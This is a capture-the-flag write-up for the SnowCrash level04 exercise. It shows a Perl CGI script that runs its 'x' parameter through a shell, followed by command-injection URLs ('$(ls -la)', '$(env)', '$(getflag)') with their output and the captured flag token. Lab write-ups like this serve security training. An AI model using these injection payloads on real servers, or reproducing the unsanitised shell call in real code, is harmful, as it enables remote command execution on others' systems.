[README.md](../README.md)
# level04

## What's new
- after logging in as level04 something new appears, a Pearl script: 
``` 
level04@SnowCrash:~$ ls
level04.pl
```

## What is Perl
Perl is a high-level, interpreted programming language known for its strong text processing capabilities and flexibility. It's commonly used for web development, system administration, network programming, and other tasks. Perl features powerful regular expressions, dynamic typing, and a large collection of built-in functions and modules. It's often used for tasks involving text manipulation, data extraction, and automation.

## The script content: what's that ?
If we `cat level04.pl` we see the following:
```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));

```
This script is a simple CGI script written in Perl that accepts a parameter named x from an HTTP request, executes the echo command with that parameter as an argument, and prints the output back to the client as HTML.

## What is CGI
CGI, or Common Gateway Interface, is a protocol that facilitates communication between web servers and external programs, known as CGI scripts. These scripts, often written in languages like Perl, Python, or C, generate dynamic web content in response to server requests. CGI enables servers to interact with these programs, allowing for dynamic content generation such as database queries, form processing, and personalized responses based on user input. While CGI was once prevalent, it has been largely replaced by more efficient technologies like server-side scripting languages and application servers. Nonetheless, CGI remains foundational in understanding the evolution of dynamic web content generation.

## So what ?
So, we can open up a browser on the host machine, conenct to the ip address, at port 4747, of the snow_crash web server and pass a shell command as an argument to parameter x in the URL to get the results displayed in the browser..
Not clear?
- If we `http://$IP_ADDRESS:4747/?x=$(ls -la)`we get displayed the list of files in the current directory: `total 4 dr-xr-x---+ 2 flag04 level04 60 Feb 24 11:23 . drwxr-xr-x 1 root root 100 Feb 24 11:23 .. -r-xr-x---+ 1 flag04 level04 152 Feb 24 11:23 level04.pl`
- If we `http://$IP_ADDRESS:4747/?x=$(env)`we get displayed the env variables of the snow_crash server: 
```
GATEWAY_INTERFACE=CGI/1.1 REMOTE_ADDR=172.16.197.1 QUERY_STRING=x=$(env) HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 DOCUMENT_ROOT=/var/www/level04/ REMOTE_PORT=36174 HTTP_UPGRADE_INSECURE_REQUESTS=1 HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 SERVER_SIGNATURE=
Apache/2.2.22 (Ubuntu) Server at 172.16.197.128 Port 4747
SCRIPT_FILENAME=/var/www/level04/level04.pl HTTP_HOST=172.16.197.128:4747 REQUEST_URI=/?x=$(env) SERVER_SOFTWARE=Apache/2.2.22 (Ubuntu) HTTP_CONNECTION=keep-alive PATH=/usr/local/bin:/usr/bin:/bin HTTP_ACCEPT_LANGUAGE=fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7 SERVER_PROTOCOL=HTTP/1.1 HTTP_ACCEPT_ENCODING=gzip, deflate REQUEST_METHOD=GET SERVER_ADDR=172.16.197.128 SERVER_ADMIN=[no address given] PWD=/var/www/level04 SERVER_PORT=4747 SCRIPT_NAME=/level04.pl SERVER_NAME=172.16.197.128
```
- and if we `http://$IP_ADDRESS:4747/?x=$(getflag)` ? We get our flag: `Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap`

